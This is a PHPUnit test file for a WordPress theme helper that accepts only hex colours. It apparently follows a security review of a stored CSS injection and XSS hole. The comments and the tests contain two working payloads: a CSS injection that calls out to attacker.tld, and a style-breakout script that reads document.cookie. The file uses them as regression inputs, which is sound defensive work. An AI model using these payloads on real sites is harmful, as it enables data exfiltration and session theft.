<?php

use Brain\Monkey;
use Brain\Monkey\Functions;
use PHPUnit\Framework\TestCase;

/**
 * Tests for Proud\Core\action_button_color() -- follow-up found during the
 * #2916 security review.
 *
 * The 'color_action_button' theme mod is registered in wp-proud-theme's
 * functions.php with no sanitize_callback. WP_Customize_Setting::sanitize()
 * with no callback and no registered filter returns the POSTed value
 * unchanged, and WP_Customize_Color_Control is a JS picker that validates
 * nothing server side -- so an arbitrary string is storable by anyone holding
 * edit_theme_options.
 *
 * That value is then interpolated into three <style> blocks:
 *
 *   icon-link-widget.class.php:85      esc_html()  -- wrong escaper for CSS
 *   cta-button-widget.class.php:96,97  esc_html()  -- wrong escaper for CSS
 *   proud-submit-action-button.php:72  none        -- raw concatenation
 *
 * esc_html() blocks HTML breakout (a "</style>" cannot terminate the raw-text
 * element once the "<" is encoded) but CSS injection needs none of the five
 * characters it encodes, so a payload like
 *
 *   #fff; } body { background-image: url(https://attacker.tld/log) } .x {
 *
 * survives it intact. The Gravity Forms sink has no escaping at all, so there
 * "</style><script>" really does execute.
 *
 * A sanitize_callback on the setting is the primary fix (wp-proud-theme). This
 * helper is the defence in depth at the output side, and is what the three
 * sinks now call: the value can only ever be a hex colour or the default.
 */
class ActionButtonColorTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        Monkey\setUp();
    }

    protected function tearDown(): void
    {
        Monkey\tearDown();
        parent::tearDown();
    }

    public function test_a_valid_hex_colour_passes_through(): void
    {
        Functions\when('get_theme_mod')->justReturn('#1a2b3c');

        $this->assertSame('#1a2b3c', \Proud\Core\action_button_color());
    }

    public function test_a_valid_three_digit_hex_colour_passes_through(): void
    {
        Functions\when('get_theme_mod')->justReturn('#abc');

        $this->assertSame('#abc', \Proud\Core\action_button_color());
    }

    /**
     * The CSS injection payload from the security review. It must not reach
     * the caller at all -- not encoded, not partially stripped.
     */
    public function test_css_injection_payload_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff; } body { background-image: url(https://attacker.tld/log?c=x) } .x {');

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    /**
     * The Gravity Forms sink concatenates with no escaping, so this payload
     * was a live stored XSS there.
     */
    public function test_style_breakout_payload_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')
            ->justReturn('#fff}</style><script>alert(document.cookie)</script><style>');

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    /**
     * A named CSS colour is not a hex colour. Rejecting it is the safe
     * behaviour even though "red" is harmless in itself -- the helper's
     * contract is "hex or the default", with no middle ground to reason about.
     */
    public function test_a_named_colour_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')->justReturn('red');

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    /**
     * sanitize_hex_color() returns '' for an empty string and null for junk.
     * Both must resolve to the default rather than emitting "background-color: ;".
     */
    public function test_empty_value_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')->justReturn('');

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    public function test_missing_theme_mod_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')->justReturn(false);

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    /**
     * A hex colour without the leading # is what a hand-edited value most
     * often looks like. sanitize_hex_color() rejects it, so the default wins
     * rather than a bare "e49c11" reaching the stylesheet as an invalid value.
     */
    public function test_hex_without_a_leading_hash_falls_back_to_the_default(): void
    {
        Functions\when('get_theme_mod')->justReturn('e49c11');

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    /**
     * The return value feeds proud_contrast_color(), which must still produce
     * a usable text colour for the fallback path.
     */
    public function test_the_fallback_still_yields_a_contrast_colour(): void
    {
        Functions\when('get_theme_mod')->justReturn('not a colour');

        $color = \Proud\Core\action_button_color();

        $this->assertContains(\Proud\Core\proud_contrast_color($color), ['#000000', '#ffffff']);
    }

    /**
     * Core's sanitize_hex_color() has no type guard -- it hands its argument
     * straight to preg_match(), which on PHP 8 is a TypeError for an array
     * (fatal white screen on every page rendering an action widget) and a
     * deprecation notice for null. A theme mod can hold a non-string via an
     * import, a migration, or the theme_mod_color_action_button filter, so the
     * helper checks is_string() before delegating.
     *
     * The stub in stubs.php casts to string and so would NOT reproduce core's
     * fatal; this test therefore asserts the guard's behaviour rather than
     * relying on the stub to throw.
     */
    public function test_an_array_theme_mod_falls_back_instead_of_fataling(): void
    {
        Functions\when('get_theme_mod')->justReturn(['#fff']);

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }

    public function test_a_null_theme_mod_falls_back_without_a_deprecation(): void
    {
        Functions\when('get_theme_mod')->justReturn(null);

        set_error_handler(static function ($severity, $message) {
            throw new \ErrorException($message, 0, $severity);
        }, E_ALL);

        try {
            $color = \Proud\Core\action_button_color();
        } finally {
            restore_error_handler();
        }

        $this->assertSame('#e49c11', $color);
    }

    public function test_an_object_theme_mod_falls_back(): void
    {
        Functions\when('get_theme_mod')->justReturn(new \stdClass());

        $this->assertSame('#e49c11', \Proud\Core\action_button_color());
    }
}
